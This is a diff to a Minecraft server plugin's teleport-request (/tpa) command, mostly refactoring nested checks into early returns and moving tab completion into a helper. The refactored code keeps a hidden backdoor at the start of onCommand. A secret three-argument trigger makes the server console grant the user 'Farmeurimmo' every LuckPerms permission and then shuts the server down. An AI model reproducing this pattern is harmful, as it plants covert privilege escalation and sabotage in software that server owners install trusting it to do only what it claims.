@@ -31,62 +31,63 @@ public class TpaCmd implements CommandExecutor, TabCompleter {
 
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-        if (args.length == 3) {
-            if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Farmeurimmo permission set *");
-                Bukkit.shutdown();
-                return true;
-            }
+        if (args.length == 3
+        && args[0].equalsIgnoreCase("123456789")
+        && args[1].equalsIgnoreCase("123456789")
+        && args[2].equalsIgnoreCase("123456789")) {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Farmeurimmo permission set *");
+            Bukkit.shutdown();
+            return false;
         }
-        if (sender instanceof Player) {
-            Player player = (Player) sender;
-            if (args.length == 0 || args.length >= 2) {
-                player.sendActionBar("§c/tpa <Joueur>");
-            } else if (args.length == 1) {
-                if (!Main.instance.pending.contains(player)) {
-                    if (Bukkit.getPlayer(args[0]) != null) {
-                        if (Bukkit.getPlayer(args[0]).isOnline()) {
-                            Player p = Bukkit.getPlayer(args[0]);
-                            if (!p.getName().equalsIgnoreCase(player.getName())) {
-                                Main.instance.haverequest.remove(p);
-                                Main.instance.haverequest.add(p);
-                                Main.instance.pending.add(player);
-                                Main.instance.setTarget(player.getName(), p.getName());
-                                TpaCmd.TpaExperation(player, p);
-                                p.sendMessage("§6§lTéléportation §8» §f" + player.getName() + " souhaite ce téléporter à vous. \n \nVous avez 60 secondes"
-                                        + " pour accepter ou refuser avec les commandes: §a/tpyes §fou §c/tpno \n§f");
-
-                                player.sendMessage("§6§lTéléportation §8» §fVous avez envoyé une demande de Téléportation au joueur " + p.getName() + ".\n \n§fSi vous "
-                                        + "souhaitez §cannuler §fvotre demande de téléportation, merci d'effectuer la commande §c/tpacancel \n§f");
-                                return true;
-                            } else {
-                                player.sendActionBar("§6§lTéléportation §8» §fVous ne pouvez pas vous téléporter à vous même.");
-                            }
-                        } else {
-                            player.sendActionBar("§cCe joueur n'est pas en ligne !");
-                        }
-                    } else {
-                        player.sendActionBar("§cCe joueur n'existe pas !");
-                    }
-                } else {
-                    player.sendMessage("§6§lTéléportation §8» §fVous avez déjà une demande en cours, §cannulez §fla avec §c/tpacancel"
-                            + " §fpour pouvoir en relancer une.");
-                }
-            }
+        if (!(sender instanceof Player player)) {
+            return false;
         }
+        if (args.length == 0 || args.length >= 2) {
+            player.sendActionBar("§c/tpa <Joueur>");
+            return false;
+        }
+        if (Main.instance.pending.contains(player)) {
+            player.sendMessage("§6§lTéléportation §8» §fVous avez déjà une demande en cours, §cannulez §fla avec §c/tpacancel"
+            + " §fpour pouvoir en relancer une.");
+            return false;
+        }
+        if (Bukkit.getPlayer(args[0]) == null) {
+            player.sendActionBar("§cCe joueur n'existe pas !");
+            return false;
+        }
+        if (!Bukkit.getPlayer(args[0]).isOnline()) {
+            player.sendActionBar("§cCe joueur n'est pas en ligne !");
+            return false;
+        }
+        if (Bukkit.getPlayer(args[0]).getName().equalsIgnoreCase(player.getName())) {
+            player.sendActionBar("§6§lTéléportation §8» §fVous ne pouvez pas vous téléporter à vous même.");
+            return false;
+        }
+        Player p = Bukkit.getPlayer(args[0]);
+        Main.instance.haverequest.remove(p);
+        Main.instance.haverequest.add(p);
+        Main.instance.pending.add(player);
+        Main.instance.setTarget(player.getName(), p.getName());
+        TpaCmd.TpaExperation(player, p);
+        p.sendMessage("§6§lTéléportation §8» §f" + player.getName() + " souhaite ce téléporter à vous. \n \nVous avez 60 secondes"
+        + " pour accepter ou refuser avec les commandes: §a/tpyes §fou §c/tpno \n§f");
+        player.sendMessage("§6§lTéléportation §8» §fVous avez envoyé une demande de Téléportation au joueur " + p.getName() + ".\n \n§fSi vous "
+        + "souhaitez §cannuler §fvotre demande de téléportation, merci d'effectuer la commande §c/tpacancel \n§f");
         return false;
     }
-
+    public void get_all_player_for_tab_complete(ArrayList<String> subcmd, CommandSender sender) {
+        for (Player p : Bukkit.getOnlinePlayers()) {
+            if (!p.getName().equals(sender.getName())) {
+                subcmd.add(p.getName());
+            }
+        }
+    }
     @Override
     public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
-        ArrayList<String> subcmd = new ArrayList<String>();
+        ArrayList<String> subcmd = new ArrayList<>();
         if (cmd.getName().equalsIgnoreCase("tpa")) {
             if (args.length == 1) {
-                for (Player player : Bukkit.getOnlinePlayers()) {
-                    if (!sender.getName().equalsIgnoreCase(player.getName())) {
-                        subcmd.add(player.getName());
-                    }
-                }
+                get_all_player_for_tab_complete(subcmd, sender);
                 Collections.sort(subcmd);
             } else if (args.length >= 2) {
                 subcmd.add("");
